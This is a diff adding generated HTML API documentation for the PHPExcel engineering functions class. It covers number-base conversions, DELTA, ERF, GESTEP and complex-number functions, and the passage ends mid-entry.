+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>string</code><p>The decimal integer you want to convert. If number is negative,
+                            places is ignored and DEC2HEX returns a 10-character (40-bit)
+                            hexadecimal number in which the most significant bit is the sign
+                            bit. The remaining 39 bits are magnitude bits. Negative numbers
+                            are represented using two's-complement notation.
+                            If number < -549,755,813,888 or if number > 549,755,813,887,
+                            DEC2HEX returns the #NUM! error value.
+                            If number is nonnumeric, DEC2HEX returns the #VALUE! error value.
+                            If DEC2HEX requires more than places characters, it returns the
+                            #NUM! error value.</p>
+</div>
+<div class="subelement argument">
+<h4>$places</h4>
+<code>integer</code><p>The number of characters to use. If places is omitted, DEC2HEX uses
+                            the minimum number of characters necessary. Places is useful for
+                            padding the return value with leading 0s (zeros).
+                            If places is not an integer, it is truncated.
+                            If places is nonnumeric, DEC2HEX returns the #VALUE! error value.
+                            If places is zero or negative, DEC2HEX returns the #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_DECTOOCT"></a><div class="element clickable method public method_DECTOOCT" data-toggle="collapse" data-target=".method_DECTOOCT .collapse">
+<h2>DECTOOCT</h2>
+<pre>DECTOOCT(string $x, integer $places) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Return an decimal value as octal.</p>
+
+<p>Excel Function:
+    DEC2OCT(x[,places])</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>string</code><p>The decimal integer you want to convert. If number is negative,
+                            places is ignored and DEC2OCT returns a 10-character (30-bit)
+                            octal number in which the most significant bit is the sign bit.
+                            The remaining 29 bits are magnitude bits. Negative numbers are
+                            represented using two's-complement notation.
+                            If number < -536,870,912 or if number > 536,870,911, DEC2OCT
+                            returns the #NUM! error value.
+                            If number is nonnumeric, DEC2OCT returns the #VALUE! error value.
+                            If DEC2OCT requires more than places characters, it returns the
+                            #NUM! error value.</p>
+</div>
+<div class="subelement argument">
+<h4>$places</h4>
+<code>integer</code><p>The number of characters to use. If places is omitted, DEC2OCT uses
+                            the minimum number of characters necessary. Places is useful for
+                            padding the return value with leading 0s (zeros).
+                            If places is not an integer, it is truncated.
+                            If places is nonnumeric, DEC2OCT returns the #VALUE! error value.
+                            If places is zero or negative, DEC2OCT returns the #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_DELTA"></a><div class="element clickable method public method_DELTA" data-toggle="collapse" data-target=".method_DELTA .collapse">
+<h2>DELTA</h2>
+<pre>DELTA(float $a, float $b) : int</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Tests whether two values are equal. Returns 1 if number1 = number2; returns 0 otherwise.
+Use this function to filter a set of values. For example, by summing several DELTA
+functions you calculate the count of equal pairs. This function is also known as the
+Kronecker Delta function.</p>
+
+<p>Excel Function:
+    DELTA(a[,b])</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$a</h4>
+<code>float</code><p>The first number.</p></div>
+<div class="subelement argument">
+<h4>$b</h4>
+<code>float</code><p>The second number. If omitted, b is assumed to be zero.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>int</code></div>
+</div></div>
+</div>
+<a id="method_ERF"></a><div class="element clickable method public method_ERF" data-toggle="collapse" data-target=".method_ERF .collapse">
+<h2>ERF</h2>
+<pre>ERF(float $lower, float $upper) : float</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the error function integrated between the lower and upper bound arguments.</p>
+
+<p>Note: In Excel 2007 or earlier, if you input a negative value for the upper or lower bound arguments,
+        the function would return a #NUM! error. However, in Excel 2010, the function algorithm was
+        improved, so that it can now calculate the function for both positive and negative ranges.
+        PHPExcel follows Excel 2010 behaviour, and accepts nagative arguments.</p>
+
+<p>Excel Function:
+    ERF(lower[,upper])</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$lower</h4>
+<code>float</code><p>lower bound for integrating ERF</p></div>
+<div class="subelement argument">
+<h4>$upper</h4>
+<code>float</code><p>upper bound for integrating ERF.
+							If omitted, ERF integrates between zero and lower_limit</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>float</code></div>
+</div></div>
+</div>
+<a id="method_ERFC"></a><div class="element clickable method public method_ERFC" data-toggle="collapse" data-target=".method_ERFC .collapse">
+<h2>ERFC</h2>
+<pre>ERFC(float $x) : float</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the complementary ERF function integrated between x and infinity</p>
+
+<p>Note: In Excel 2007 or earlier, if you input a negative value for the lower bound argument,
+    the function would return a #NUM! error. However, in Excel 2010, the function algorithm was
+    improved, so that it can now calculate the function for both positive and negative x values.
+        PHPExcel follows Excel 2010 behaviour, and accepts nagative arguments.</p>
+
+<p>Excel Function:
+    ERFC(x)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>float</code><p>The lower bound for integrating ERFC</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>float</code></div>
+</div></div>
+</div>
+<a id="method_GESTEP"></a><div class="element clickable method public method_GESTEP" data-toggle="collapse" data-target=".method_GESTEP .collapse">
+<h2>GESTEP</h2>
+<pre>GESTEP(float $number, float $step) : int</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Excel Function:
+    GESTEP(number[,step])</p>
+
+<p>Returns 1 if number >= step; returns 0 (zero) otherwise
+Use this function to filter a set of values. For example, by summing several GESTEP
+functions you calculate the count of values that exceed a threshold.</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$number</h4>
+<code>float</code><p>The value to test against step.</p></div>
+<div class="subelement argument">
+<h4>$step</h4>
+<code>float</code><p>The threshold value.
+								If you omit a value for step, GESTEP uses zero.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>int</code></div>
+</div></div>
+</div>
+<a id="method_HEXTOBIN"></a><div class="element clickable method public method_HEXTOBIN" data-toggle="collapse" data-target=".method_HEXTOBIN .collapse">
+<h2>HEXTOBIN</h2>
+<pre>HEXTOBIN(string $x, integer $places) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Return a hex value as binary.</p>
+
+<p>Excel Function:
+    HEX2BIN(x[,places])</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>string</code><p>the hexadecimal number you want to convert. Number cannot
+                                contain more than 10 characters. The most significant bit of
+                                number is the sign bit (40th bit from the right). The remaining
+                                9 bits are magnitude bits. Negative numbers are represented
+                                using two's-complement notation.
+                                If number is negative, HEX2BIN ignores places and returns a
+                                10-character binary number.
+                                If number is negative, it cannot be less than FFFFFFFE00, and
+                                if number is positive, it cannot be greater than 1FF.
+                                If number is not a valid hexadecimal number, HEX2BIN returns
+                                the #NUM! error value.
+                                If HEX2BIN requires more than places characters, it returns
+                                the #NUM! error value.</p>
+</div>
+<div class="subelement argument">
+<h4>$places</h4>
+<code>integer</code><p>The number of characters to use. If places is omitted,
+                                HEX2BIN uses the minimum number of characters necessary. Places
+                                is useful for padding the return value with leading 0s (zeros).
+                                If places is not an integer, it is truncated.
+                                If places is nonnumeric, HEX2BIN returns the #VALUE! error value.
+                                If places is negative, HEX2BIN returns the #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_HEXTODEC"></a><div class="element clickable method public method_HEXTODEC" data-toggle="collapse" data-target=".method_HEXTODEC .collapse">
+<h2>HEXTODEC</h2>
+<pre>HEXTODEC(string $x) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Return a hex value as decimal.</p>
+
+<p>Excel Function:
+    HEX2DEC(x)</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>string</code><p>The hexadecimal number you want to convert. This number cannot
+                            contain more than 10 characters (40 bits). The most significant
+                            bit of number is the sign bit. The remaining 39 bits are magnitude
+                            bits. Negative numbers are represented using two's-complement
+                            notation.
+                            If number is not a valid hexadecimal number, HEX2DEC returns the
+                            #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_HEXTOOCT"></a><div class="element clickable method public method_HEXTOOCT" data-toggle="collapse" data-target=".method_HEXTOOCT .collapse">
+<h2>HEXTOOCT</h2>
+<pre>HEXTOOCT(string $x, integer $places) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Return a hex value as octal.</p>
+
+<p>Excel Function:
+    HEX2OCT(x[,places])</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>string</code><p>The hexadecimal number you want to convert. Number cannot
+                                contain more than 10 characters. The most significant bit of
+                                number is the sign bit. The remaining 39 bits are magnitude
+                                bits. Negative numbers are represented using two's-complement
+                                notation.
+                                If number is negative, HEX2OCT ignores places and returns a
+                                10-character octal number.
+                                If number is negative, it cannot be less than FFE0000000, and
+                                if number is positive, it cannot be greater than 1FFFFFFF.
+                                If number is not a valid hexadecimal number, HEX2OCT returns
+                                the #NUM! error value.
+                                If HEX2OCT requires more than places characters, it returns
+                                the #NUM! error value.</p>
+</div>
+<div class="subelement argument">
+<h4>$places</h4>
+<code>integer</code><p>The number of characters to use. If places is omitted, HEX2OCT
+                                uses the minimum number of characters necessary. Places is
+                                useful for padding the return value with leading 0s (zeros).
+                                If places is not an integer, it is truncated.
+                                If places is nonnumeric, HEX2OCT returns the #VALUE! error
+                                value.
+                                If places is negative, HEX2OCT returns the #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_IMABS"></a><div class="element clickable method public method_IMABS" data-toggle="collapse" data-target=".method_IMABS .collapse">
+<h2>IMABS</h2>
+<pre>IMABS(string $complexNumber) : float</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the absolute value (modulus) of a complex number in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMABS(complexNumber)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number for which you want the absolute value.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>float</code></div>
+</div></div>
+</div>
+<a id="method_IMAGINARY"></a><div class="element clickable method public method_IMAGINARY" data-toggle="collapse" data-target=".method_IMAGINARY .collapse">
+<h2>IMAGINARY</h2>
+<pre>IMAGINARY(string $complexNumber) : float</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the imaginary coefficient of a complex number in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMAGINARY(complexNumber)</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number for which you want the imaginary
+										coefficient.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>float</code></div>
+</div></div>
+</div>
+<a id="method_IMARGUMENT"></a><div class="element clickable method public method_IMARGUMENT" data-toggle="collapse" data-target=".method_IMARGUMENT .collapse">
+<h2>IMARGUMENT</h2>
+<pre>IMARGUMENT(string $complexNumber) : float</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the argument theta of a complex number, i.e. the angle in radians from the real
+axis to the representation of the number in polar coordinates.</p>
+
+<p>Excel Function:
+    IMARGUMENT(complexNumber)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number for which you want the argument theta.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>float</code></div>
+</div></div>
+</div>
+<a id="method_IMCONJUGATE"></a><div class="element clickable method public method_IMCONJUGATE" data-toggle="collapse" data-target=".method_IMCONJUGATE .collapse">
+<h2>IMCONJUGATE</h2>
+<pre>IMCONJUGATE(string $complexNumber) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the complex conjugate of a complex number in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMCONJUGATE(complexNumber)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number for which you want the conjugate.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_IMCOS"></a><div class="element clickable method public method_IMCOS" data-toggle="collapse" data-target=".method_IMCOS .collapse">
+<h2>IMCOS</h2>
+<pre>IMCOS(string $complexNumber) : string | float</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the cosine of a complex number in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMCOS(complexNumber)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number for which you want the cosine.</p></div>
+<h3>Returns</h3>
+<div class="subelement response">
+<code>string</code><code>float</code>
+</div>
+</div></div>
+</div>
+<a id="method_IMDIV"></a><div class="element clickable method public method_IMDIV" data-toggle="collapse" data-target=".method_IMDIV .collapse">
+<h2>IMDIV</h2>
+<pre>IMDIV(string $complexDividend, string $complexDivisor) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the quotient of two complex numbers in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMDIV(complexDividend,complexDivisor)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexDividend</h4>
+<code>string</code><p>The complex numerator or dividend.</p></div>
+<div class="subelement argument">
+<h4>$complexDivisor</h4>
+<code>string</code><p>The complex denominator or divisor.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_IMEXP"></a><div class="element clickable method public method_IMEXP" data-toggle="collapse" data-target=".method_IMEXP .collapse">
+<h2>IMEXP</h2>
+<pre>IMEXP(string $complexNumber) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the exponential of a complex number in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMEXP(complexNumber)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number for which you want the exponential.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_IMLN"></a><div class="element clickable method public method_IMLN" data-toggle="collapse" data-target=".method_IMLN .collapse">
+<h2>IMLN</h2>
+<pre>IMLN(string $complexNumber) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the natural logarithm of a complex number in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMLN(complexNumber)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number for which you want the natural logarithm.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_IMLOG10"></a><div class="element clickable method public method_IMLOG10" data-toggle="collapse" data-target=".method_IMLOG10 .collapse">
+<h2>IMLOG10</h2>
+<pre>IMLOG10(string $complexNumber) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the common logarithm (base 10) of a complex number in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMLOG10(complexNumber)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number for which you want the common logarithm.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_IMLOG2"></a><div class="element clickable method public method_IMLOG2" data-toggle="collapse" data-target=".method_IMLOG2 .collapse">
+<h2>IMLOG2</h2>
+<pre>IMLOG2(string $complexNumber) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the base-2 logarithm of a complex number in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMLOG2(complexNumber)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number for which you want the base-2 logarithm.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_IMPOWER"></a><div class="element clickable method public method_IMPOWER" data-toggle="collapse" data-target=".method_IMPOWER .collapse">
+<h2>IMPOWER</h2>
+<pre>IMPOWER(string $complexNumber, float $realNumber) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns a complex number in x + yi or x + yj text format raised to a power.</p>
+
+<p>Excel Function:
+    IMPOWER(complexNumber,realNumber)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number you want to raise to a power.</p></div>
+<div class="subelement argument">
+<h4>$realNumber</h4>
+<code>float</code><p>The power to which you want to raise the complex number.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_IMPRODUCT"></a><div class="element clickable method public method_IMPRODUCT" data-toggle="collapse" data-target=".method_IMPRODUCT .collapse">
+<h2>IMPRODUCT</h2>
+<pre>IMPRODUCT() : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the product of two or more complex numbers in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMPRODUCT(complexNumber[,complexNumber[,...]])</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_IMREAL"></a><div class="element clickable method public method_IMREAL" data-toggle="collapse" data-target=".method_IMREAL .collapse">
+<h2>IMREAL</h2>
+<pre>IMREAL(string $complexNumber) : float</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the real coefficient of a complex number in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMREAL(complexNumber)</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number for which you want the real coefficient.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>float</code></div>
+</div></div>
+</div>
+<a id="method_IMSIN"></a><div class="element clickable method public method_IMSIN" data-toggle="collapse" data-target=".method_IMSIN .collapse">
+<h2>IMSIN</h2>
+<pre>IMSIN(string $complexNumber) : string | float</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the sine of a complex number in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMSIN(complexNumber)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number for which you want the sine.</p></div>
+<h3>Returns</h3>
+<div class="subelement response">
+<code>string</code><code>float</code>
+</div>
+</div></div>
+</div>
+<a id="method_IMSQRT"></a><div class="element clickable method public method_IMSQRT" data-toggle="collapse" data-target=".method_IMSQRT .collapse">
+<h2>IMSQRT</h2>
+<pre>IMSQRT(string $complexNumber) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the square root of a complex number in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMSQRT(complexNumber)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number for which you want the square root.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_IMSUB"></a><div class="element clickable method public method_IMSUB" data-toggle="collapse" data-target=".method_IMSUB .collapse">
+<h2>IMSUB</h2>
+<pre>IMSUB(string $complexNumber1, string $complexNumber2) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the difference of two complex numbers in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMSUB(complexNumber1,complexNumber2)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber1</h4>
+<code>string</code><p>The complex number from which to subtract complexNumber2.</p></div>
+<div class="subelement argument">
+<h4>$complexNumber2</h4>
+<code>string</code><p>The complex number to subtract from complexNumber1.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_IMSUM"></a><div class="element clickable method public method_IMSUM" data-toggle="collapse" data-target=".method_IMSUM .collapse">
+<h2>IMSUM</h2>
+<pre>IMSUM() : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the sum of two or more complex numbers in x + yi or x + yj text format.</p>
+
+<p>Excel Function:
+    IMSUM(complexNumber[,complexNumber[,...]])</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_OCTTOBIN"></a><div class="element clickable method public method_OCTTOBIN" data-toggle="collapse" data-target=".method_OCTTOBIN .collapse">
+<h2>OCTTOBIN</h2>
+<pre>OCTTOBIN(string $x, integer $places) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Return an octal value as binary.</p>
+
+<p>Excel Function:
+    OCT2BIN(x[,places])</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>string</code><p>The octal number you want to convert. Number may not
+                                contain more than 10 characters. The most significant
+                                bit of number is the sign bit. The remaining 29 bits
+                                are magnitude bits. Negative numbers are represented
+                                using two's-complement notation.
+                                If number is negative, OCT2BIN ignores places and returns
+                                a 10-character binary number.
+                                If number is negative, it cannot be less than 7777777000,
+                                and if number is positive, it cannot be greater than 777.
+                                If number is not a valid octal number, OCT2BIN returns
+                                the #NUM! error value.
+                                If OCT2BIN requires more than places characters, it
+                                returns the #NUM! error value.</p>
+</div>
+<div class="subelement argument">
+<h4>$places</h4>
+<code>integer</code><p>The number of characters to use. If places is omitted,
+                                OCT2BIN uses the minimum number of characters necessary.
+                                Places is useful for padding the return value with
+                                leading 0s (zeros).
+                                If places is not an integer, it is truncated.
+                                If places is nonnumeric, OCT2BIN returns the #VALUE!
+                                error value.
+                                If places is negative, OCT2BIN returns the #NUM! error
+                                value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_OCTTODEC"></a><div class="element clickable method public method_OCTTODEC" data-toggle="collapse" data-target=".method_OCTTODEC .collapse">
+<h2>OCTTODEC</h2>
+<pre>OCTTODEC(string $x) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Return an octal value as decimal.</p>
+
+<p>Excel Function:
+    OCT2DEC(x)</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>string</code><p>The octal number you want to convert. Number may not contain
+                            more than 10 octal characters (30 bits). The most significant
+                            bit of number is the sign bit. The remaining 29 bits are
+                            magnitude bits. Negative numbers are represented using
+                            two's-complement notation.
+                            If number is not a valid octal number, OCT2DEC returns the
+                            #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_OCTTOHEX"></a><div class="element clickable method public method_OCTTOHEX" data-toggle="collapse" data-target=".method_OCTTOHEX .collapse">
+<h2>OCTTOHEX</h2>
+<pre>OCTTOHEX(string $x, integer $places) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Return an octal value as hex.</p>
+
+<p>Excel Function:
+    OCT2HEX(x[,places])</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>string</code><p>The octal number you want to convert. Number may not contain
+                                more than 10 octal characters (30 bits). The most significant
+                                bit of number is the sign bit. The remaining 29 bits are
+                                magnitude bits. Negative numbers are represented using
+                                two's-complement notation.
+                                If number is negative, OCT2HEX ignores places and returns a
+                                10-character hexadecimal number.
+                                If number is not a valid octal number, OCT2HEX returns the
+                                #NUM! error value.
+                                If OCT2HEX requires more than places characters, it returns
+                                the #NUM! error value.</p>
+</div>
+<div class="subelement argument">
+<h4>$places</h4>
+<code>integer</code><p>The number of characters to use. If places is omitted, OCT2HEX
+                                uses the minimum number of characters necessary. Places is useful
+                                for padding the return value with leading 0s (zeros).
+                                If places is not an integer, it is truncated.
+                                If places is nonnumeric, OCT2HEX returns the #VALUE! error value.
+                                If places is negative, OCT2HEX returns the #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method__erfVal"></a><div class="element clickable method public method__erfVal" data-toggle="collapse" data-target=".method__erfVal .collapse">
+<h2>_erfVal()
+        </h2>
+<pre>_erfVal($x) </pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"></div>
+<h3>Parameters</h3>
+<div class="subelement argument"><h4>$x</h4></div>
+</div></div>
+</div>
+<a id="method__parseComplex"></a><div class="element clickable method public method__parseComplex" data-toggle="collapse" data-target=".method__parseComplex .collapse">
+<h2>_parseComplex</h2>
+<pre>_parseComplex(string $complexNumber) : string[]</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Parses a complex number into its real and imaginary parts, and an I or J suffix</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number</p></div>
+<h3>Returns</h3>
+<div class="subelement response">
+<code>string[]</code>Indexed on "real", "imaginary" and "suffix"</div>
+</div></div>
+</div>
+<a id="method_getConversionGroupUnitDetails"></a><div class="element clickable method public method_getConversionGroupUnitDetails" data-toggle="collapse" data-target=".method_getConversionGroupUnitDetails .collapse">
+<h2>getConversionGroupUnitDetails</h2>
+<pre>getConversionGroupUnitDetails(string $group) : array</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$group</h4>
+<code>string</code><p>The group whose units of measure you want to retrieve</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>array</code></div>
+</div></div>
+</div>
+<a id="method_getConversionGroupUnits"></a><div class="element clickable method public method_getConversionGroupUnits" data-toggle="collapse" data-target=".method_getConversionGroupUnits .collapse">
+<h2>getConversionGroupUnits
+Returns an array of units of measure, for a specified conversion group, or for all groups</h2>
+<pre>getConversionGroupUnits(string $group) : array</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$group</h4>
+<code>string</code><p>The group whose units of measure you want to retrieve</p></div>
+<h3>Returns</h3>
